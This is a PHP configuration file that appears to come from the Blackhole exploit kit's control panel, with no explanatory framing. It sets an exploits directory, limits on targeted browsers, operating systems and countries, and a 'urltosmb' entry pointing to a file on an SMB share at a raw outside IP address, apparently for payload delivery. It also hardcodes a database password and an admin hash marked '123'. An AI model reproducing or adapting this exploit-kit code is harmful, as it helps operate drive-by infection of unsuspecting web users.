<?php

	class Config {
		static private $config = array(
		/* ---config--- */
							'Version'					=> '1.0.2',
							'StatFileName'				=> 'stat',
							'MainFileName'				=> 'index',
							'DownloadFileName'			=> 'd',
							'ExploitsDir'				=> 'games',
							'urltosmb'					=> '195.80.151.59\\\\pub\\\\new.avi',
							'AjaxAutoreloadInterval'	=> '10',
							
							'MaxCountriesLimit'			=> '15',
							'MaxOSLimit'				=> '10',
							'MaxExploitsLimit'			=> '999',
							'MaxBrowsersLimit'			=> '10',
							'MaxSecondLimit'			=> '5',
							'MaxThreadsLimit'			=> '10',
							'MaxReferersLimit'			=> '10',
							
							'AdminPass'					=> '202cb962ac59075b964b07152d234b70', // 123
							
							'MysqlHost'					=> 'localhost',
							'MysqlUsername'				=> 'blackhole',
							'MysqlPassword'				=> 'f1OqI2QP6AknVRhjNd82XexZ7CE85l',
							'MysqlDatabase'				=> 'blackhole',
							
							'LibDir'					=> 'lib',
							'FilesDir'					=> 'files',
							'JSDir'						=> 'js', //relative to LibDir directory
							'CSSDir'					=> 'css', //relative to LibDir directory
							'ImgDir'					=> 'img', //relative to LibDir directory
							'TemplatesDir'				=> 'templates',
							
							'DefaultLanguage'			=> 'ru',
							'DefaultTemplate'			=> 'default',
							
							'MainParamName'				=> 'a',
							'StatParamName'				=> 'tp',
							'AuthVariable'				=> 'Auth',
							
							'ShowReferers'				=> '0',
							'LastMaxRefererID'			=> '0',
							'virtestLogin'				=> '0:::',
							'virtestPass'				=> '',
		/* ---config--- */
						);
						
						
		static public function get($name = '', $defaultValue = '') {
			if (!isset(self::$config[$name])) {
				return $defaultValue;
			}
			
			return self::$config[$name];
		}
		
		static public function set($name = '', $value = '') {
			self::$config[$name] = $value;
		}
		
		static public function write($name, $value) {
			self::set($name, $value);
			$configFileName = Config::get('ConfigFileName');
			$lines = file('./' . $configFileName);

			foreach ($lines as &$line) {
				if (preg_match('/.+\'' . $name . '\'.+=> \'(.*)\',/i', $line, $arr)) {
					$line = str_replace('\'' . $arr[1] . '\'', '\'' . $value . '\'', $line);
				}
			}
			file_put_contents('./' . $configFileName, $lines);
		}
	}
	
?>